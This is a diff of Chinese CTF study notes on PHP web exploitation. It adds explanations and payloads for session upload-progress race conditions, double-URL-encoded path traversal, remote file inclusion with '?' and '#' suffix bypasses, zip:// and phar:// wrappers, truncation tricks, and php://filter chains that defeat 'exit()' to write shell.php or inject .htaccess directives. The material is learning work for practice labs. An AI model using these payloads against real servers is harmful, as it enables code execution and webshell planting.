@@ -459,9 +459,93 @@ linux/var/log/nginx/access.log
 
 ***
 
-## <mark style="color:blue;background-color:green;">10）竞争条件</mark>
+## <mark style="color:blue;background-color:green;">10）条件竞争</mark>
 
-本来以为可以不做这个，结果发现5道题全是竞争条件，被迫学习。首先对原理进行讲解，因为自己原理都理解了很久。
+本来以为可以不做这个，结果发现5道题全是竞争条件，被迫学习。首先对原理进行讲解，因为自己原理都理解了很久。session部分直接用手册上的来，附加自己的一些理解和注释，虽然没啥理解。
+
+其实我理解的条件竞争，就是一直发包一直发包让他在清空前就写入，就是瞎猫碰上死耗子。
+
+### <mark style="color:purple;background-color:yellow;">1)利用session进行条件竞争</mark>
+
+ctfshow上面的都是这一个，利用session进行条件竞争。
+
+我们首先要了解一些配置手册里面关于session上传的内容。
+
+```php
+session.upload_progress.enabled:启用上传进度跟踪，填充$_SESSION变量。默认为 1，启用。
+
+session.upload_progress.cleanup:读取所有 POST 数据（即上传完成）后，立即清除进度信息。默认为 1，启用。
+
+session.upload_progress.prefix（前缀):用于$_SESSION 中上传进度键的前缀。该键将与 $_POST[ini_get("session.upload_progress.name")]的值连接起来以提供唯一索引。 默认为“upload_progress_”。
+
+session.upload_progress.name:$_SESSION 中用于存储进度信息的键的名称。如果$_POST[ini_get("session.upload_progress.name")] 不通过或不可用，则不会记录上传进度。 默认为“PHP_SESSION_UPLOAD_PROGRESS”。
+
+```
+
+然后我们来了解session\_upload\_progress（会话上传进度）
+
+> 当 启用`session.upload_progress.enabled INI` 选项时，PHP 将能够跟踪正在上传的单个文件的上传进度。此信息对于实际上传请求本身并不是特别有用，但在文件上传期间，应用程序可以向单独的端点（例如 通过XHR ）发送 POST 请求以检查状态。
+>
+> 当上传正在进行时，以及当 POST 与`session.upload_progress.name INI` 设置设置 为同名的变量时， 上传进度将在`$_SESSION`超全局 中可用。当 PHP 检测到此类 POST 请求时，它将在 `$_SESSION`中填充一个数组，其中索引是 `session.upload_progress.prefix` 和 `session.upload_progress.name INI` 选项的串联值。通常通过读取这些 INI 设置来检索密钥，即
+>
+> ```php
+> <?php
+> $key = ini_get("session.upload_progress.prefix") . $_POST[ini_get("session.upload_progress.name")];
+> var_dump($_SESSION[$key]);//ini_get()就是获取配置选项的值
+> ?>
+> ```
+
+然后是手册给我们展示的两个代码，第一个是一个文件上传的html编写的表单
+
+```html
+<form action="upload.php" method="POST" enctype="multipart/form-data">
+ <input type="hidden" name="<?php echo ini_get("session.upload_progress.name"); ?>" value="123" />
+ <input type="file" name="file1" />
+ <input type="file" name="file2" />
+ <input type="submit" />
+</form>
+```
+
+这段代码的意思是第一行是交代了发送的位置是upload.php这个文件。第二行是隐藏了一个name，这个name是通过获取当前会话中文件上传进度的会话变量名来跟踪他的上传进度，后面是上传的两个文件file1,file2。
+
+<figure><img src="../.gitbook/assets/image (41).png" alt=""><figcaption></figcaption></figure>
+
+第二个是存储在session中的数据大致是这样。
+
+```php
+<?php
+$_SESSION["upload_progress_123"] = array(
+ "start_time" => 1234567890,   // 请求开始时间
+ "content_length" => 57343257, // POST 内容长度
+ "bytes_processed" => 453489,  // 已接收并处理的字节数
+ "done" => false,              // 当 POST 处理程序完成时为 true，无论成功与否
+ "files" => array(
+  0 => array(
+   "field_name" => "file1",       // <input/> 字段的名称
+   // 下面的 3 个元素与 $_FILES 中的相同
+   "name" => "foo.avi",
+   "tmp_name" => "/tmp/phpxxxxxx",
+   "error" => 0,
+   "done" => true,                // 当 POST 处理程序完成处理此文件时为 true
+   "start_time" => 1234567890,    // 此文件开始处理的时间
+   "bytes_processed" => 57343250, // 此文件已接收并处理的字节数
+  ),
+  // 另一个文件，在同一请求中尚未完成上传
+  1 => array(
+   "field_name" => "file2",
+   "name" => "bar.avi",
+   "tmp_name" => NULL,
+   "error" => 0,
+   "done" => false,
+   "start_time" => 1234567899,
+   "bytes_processed" => 54554,
+  ),
+ )
+);
+
+```
+
+这些就是需要理解的一些基础原理，做题会在ctfshow里面先做题再总结方法，网上都是直接讲题目，方法其实感觉没有。总之就是用bp或者用python脚本来发包。等熟悉了再来总结了。
 
 
 
@@ -476,6 +560,8 @@ linux/var/log/nginx/access.log
 
 
 
+
+***
 
 ## <mark style="color:blue;background-color:green;">11）绕过</mark>
 
@@ -507,18 +593,306 @@ linux/var/log/nginx/access.log
 
 ②二次编码
 
+这个二次编码指的是url的二次编码，其实他就是对url编码了一次的字符串再做了一次url编码。一个url编码的形式是%xx,两次url编码的形式就是%xxxx，从后面的2位变成了4位，所以展现几个为
+
+| 编码字符串 | 编码结果            | 编码方式    |
+| ----- | --------------- | ------- |
+| ../   | %252e%252e%252f | url二次编码 |
+| ..\\  | %252e%252e%255c | url二次编码 |
+
+
+
+### <mark style="color:purple;background-color:yellow;">（2）遇到后缀</mark>
+
+```php
+<?php
+    $file = $_GET['file'];
+    include $file.'/test/test.php';
+?>
+```
+
+文章中提到了include有两种情况，一种是结果file是个路径，是个url，一个是file是个伪协议。我们也按照上面写的来。
+
+#### <mark style="color:yellow;background-color:blue;">①解决url</mark>
+
+url拼接之后就是
+
+```url
+http://**********/path/file.php/test/test.php
+```
+
+我们可以用query(?)和fragement()来绕过。
+
+条件：
+
+* allow\_url\_fopen()=on
+* allow\_url\_include()=on
+
+#### (1)query(?)
+
+首先我们解释一下url中的query是什么
+
+> URL查询(Query)是指在URL(Uniform Resource Locator，统一资源定位符)中的问号（?）后面添加的键值对。我们的文件里面如果没有需要添加的键值对的话是就算后面有？也不起作用。
+
+姿势：
+
+在我们常写的file后面加一个？就是新的file里面应该有的
+
+```url
+index.php?file=http://remoteaddr/remoteinfo.txt?
+```
+
+如果我们要写入木马或者命令的话，只要将remoteinfo.txt的内容变成一句话木马就行。
+
+
+
+#### （2）fragment（#/%23）
+
+首先我们解释一下什么是url里面的fragment
+
+> URL片段（URL fragment）是一个附加到URL的字符串，以#为前缀。它旨在帮助浏览器识别特定内容或部分页面，并不会发送到服务器，也不会影响页面的加载。
+
+姿势：
+
+在我们常写的file后面加一个#就是新的file里面应该有的
+
+```url
+index.php?file=http://remoteaddr/remoteinfo.txt%23
+```
+
+
+
+#### <mark style="color:yellow;background-color:blue;">②解决伪协议</mark>
+
+这里主要用的是两个解压缩的两个zip://和phar://，用法在上面已经提过了。其实它的原理就是在我们知道了后缀的文件路径后，我们可以在我们本来需要zip文件下面去构造这个/test/test.zip这个文件。然后让他们去执行，这个test.zip里面就写上我们需要的执行代码或者木马。
+
+（1）zip://
+
+zip后面要用绝对路径，并且在zip后面需要用#隔开
+
+```url
+fileinclude2.php?file=zip://D:\phpStudy\PHPTutorial\WWW\J0.zip%23J0
+```
+
+<figure><img src="../.gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>
+
+（2）phar://
+
+phar后面也要用绝对路径，但是可以不用#隔开
+
+<figure><img src="../.gitbook/assets/image (43).png" alt=""><figcaption></figcaption></figure>
+
+### 其他方法
+
+#### <mark style="color:yellow;background-color:blue;">①长度截断</mark>
+
+在我们需要的执行的代码后面加./././很多很多的./，在linux下超过4096字节，在win下超过256字节，就可以成功。相当于把后面的后缀给舍去了
+
+姿势：
+
+```url
+fileinclude2.php?file=phpinfo.php/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.
+```
+
+#### <mark style="color:yellow;background-color:blue;">②%00截断</mark>
+
+%00截断原理：
+
+截断的核心，就是 `chr(0)`这个字符。先说一下这个字符，这个字符不为空 `(Null)`，也不是空字符 `("")`，更不是空格。 当程序在输出含有 `chr(0)`变量时 `chr(0)`后面的数据会被停止，换句话说，就是误把它当成结束符，后面的数据直接忽略，这就导致漏洞产生。
+
+条件：
+
+magic\_quotes\_gpc = Off（当On时，所有的`'`(单引号)，`"` (双引号)，`/`(反斜线)和`NULL`字符都会被自动加上一个反斜杠`\`进行转义。然后这时再用`%00`会变成`\0`，被转义了）
+
+姿势：
+
+```url
+index.php?file=phpinfo.php%00
+```
+
+
+
+### <mark style="color:purple;background-color:yellow;">（3）死亡绕过</mark>
+
+纯属是做题目的时候出现了死亡绕过，就在这里写一下了，不然都不知道这是个啥。
+
+需要绕过的目前看到的是exit()和die()这两个在和file\_put\_contents()。参考文章里面是exit()，但是其实做题的时候我做到的是die（），但是绕过方法都是一样的。
+
+简单介绍一下他们吧。
+
+#### <mark style="color:yellow;background-color:blue;">1）函数介绍</mark>
+
+die()/exit():die()等同于exit()
+
+> 输出一个消息并且退出当前脚本
+>
+> ```php
+> exit(string $status = ?/int $status):void
+> ```
+
+file\_put\_contents我们之前就已经讲过了，就是将后面的data写入前面的文件的函数。
+
+#### <mark style="color:yellow;background-color:blue;">2）情况</mark>
+
+这里有三种情况
+
+```php
+file_put_contents($filename,"<?php exit();".$content);
+
+file_put_contents($content,"<?php exit();".$content);
+
+file_put_contents($filename,$content."\nxxxxxxx");
+```
+
+这个代码的执行过程我们接下来会说说。
+
+#### <mark style="color:orange;">①</mark><mark style="color:orange;">`file_put_contents($filename,"<?php exit();".$content);`</mark>
+
+向指定的文件中写入一段 PHP 代码，并确保当这个文件被包含时，会立即退出执行，然后写入额外的内容 `$content`。所以就是我们能写入一句话但是不能执行。所以我们要如何绕过这个exit呢
+
+方法有四种
+
+#### 一.base64解码
+
+用base64是为了让\<?php exit();这部分用base64解码，然后解码之后是乱码，php代码就不知道写的啥了。所以就实现了对exit的绕过。但是我们的关键语句用的base64解码后写入的，所以在读取时就是base64编码的读取结果。要用base64解码写入的话需要用php://filter这个
+
+```html
+filename=php://filter/convert.base64-decode/resource=shell.php&content=aPD9waHAgcGhwaW5mbygpOz8+
+```
+
+上述就是网shell.php里面写入了\<?php exit(); aPD9waHAgcGhwaW5mbygpOz8+,这个代码的解码片段，然后再执行里面的php代码。
+
+后面的PD9waHAgcGhwaW5mbygpOz8+解码后是\<?php phpinfo(); ?>是我们想写的执行语句。这个a的存在是为了让前面的phpexit解码并且不影响后面的我们要写的语句。（base64每四个一解码），phpexit是7个，加个a变成8个才不会影响后面的我们要写入的句子。
+
+
+
+二.rot13编码绕过
+
+先解释一下什么是rot13吧
+
+> ROT13 编码是把每一个字母在字母表中向前移动 13 个字母得到。
+
+道理还是相同的，而且我们不用考虑添加一个a来凑到4的倍数之类的，只需要把rot13编码后的传入就可以了，顺便提醒一下，这个时候的过滤器的read变成了convert.string.rot13
+
+```url
+filename=php://filter/convert.string.rot13/resource=shell.php&content=<?cuc cucvasb();?>
+```
+
+{% hint style="danger" %}
+不能开启短标签，如果开启了短标签的话，前面内容就会解析，导致代码错误
+{% endhint %}
+
+
+
+三.过滤器嵌套
+
+用了一个过滤器`string.strip_tags`
+
+> `string.strip_tags`可以过滤掉html标签和php标签里的内容
+
+所以这个过滤思路就是首先让他把\<?php exit();?>去除掉，然后再来base64进行解码，所以这个就要求我们先补充一个?>,并且要先把\<?php exit();?>先去掉，而且后面我们的语句不能先解码。
+
+```url
+filename=php://filter/string.strip_tags|convert.base64-decode/resource=shell.php&content=?>PD9waHAgcGhwaW5mbygpOz8+
+```
+
+{% hint style="danger" %}
+这个在php7.3以上不能用
+{% endhint %}
+
+
+
+四. `.htaccess`的预包含利用
+
+这里先给大家看姿势再解释吧
+
+```url
+filename=php://filter/write=string.strip_tags/resource=.htaccess&
+content=?>php_value auto_prepend_file D:\\phpstudy_pro\\www\\flag.php
+```
+
+这里还是用的string.strip\_tags去去除前面的exit，然后把后面的代码写入到.htaccess文件（apache配置文件）里面。后面的代码是一个配置，PHP 配置 `auto_prepend_file`，使得在执行所有 PHP 脚本之前，会先执行 `D:\\phpstudy_pro\\www\\flag.php` 这个文件。
+
+
+
+<mark style="color:orange;">②</mark><mark style="color:orange;">`file_put_contents($content,"<?php exit();".$content);`</mark>
+
+这种情况下文件名和文件内容一致，但是我们需要前面的文件时php结尾，所以我们需要添加.php，并且需要利用filter这个还是一样的。所以我们写出来的姿势就变成了。
+
+具体解释可以看，讲得很透彻了。
+
+{% embed url="https://www.freebuf.com/articles/web/266565.html" %}
+
+一.base64编码
+
+```url
+content=php://filter/string.strip_rot13|convert.base64-decode/resource=?>PD9waHAgcGhwaW5mbygpOz8+/../shell.php
+```
+
+
+
+#### 二.rot13编码
+
+```url
+content=php://filter/string.strip_rot13|<?cuc cucvasb();?>|/resource=shell.php
+```
+
+```url
+content=php://filter/string.strip_rot13/resource=<?cuc cucvasb();?>/../shell.php
+```
+
+如果rot被过滤了，可以采用rot的二次编码
+
+这里有一个rot二次编码的脚本。
+
+```php
+<?php 
+$char = 'r'; #构造r的二次编码 
+for ($ascii1 = 0; $ascii1 < 256; $ascii1++) { 
+    for ($ascii2 = 0; $ascii2 < 256; $ascii2++) { 
+        $aaa = '%'.$ascii1.'%'.$ascii2; 
+        if(urldecode(urldecode($aaa)) == $char){ 
+            echo $char.': '.$aaa; 
+            echo "\n"; 
+        } 
+    } 
+} 
+?> 
+```
 
 
 
 
 
 
-遇到die（）
+
+#### <mark style="color:orange;">③</mark><mark style="color:orange;">`file_put_contents($filename,$content."\nxxxxxxx");`</mark>
+
+没有结束，直接输入就行了。
+
+```url
+filename=shell.php&content=<?php phpinfo();?>
+```
+
+
+
+
+
+
 
 
 
 ## <mark style="color:red;background-color:orange;">参考门：</mark>
 
-[https://www.freebuf.com/articles/web/182280.html](https://www.freebuf.com/articles/web/182280.html)
+{% embed url="https://www.freebuf.com/articles/web/182280.html" %}
 
-[https://www.anquanke.com/post/id/248627#h3-1](https://www.anquanke.com/post/id/248627#h3-1)
+{% embed url="https://www.anquanke.com/post/id/248627#h3-1" %}
+
+{% embed url="https://xiaolong22333.top/archives/114/" %}
+
+
+
+
+
+欢迎大家给我留言，🤭
+
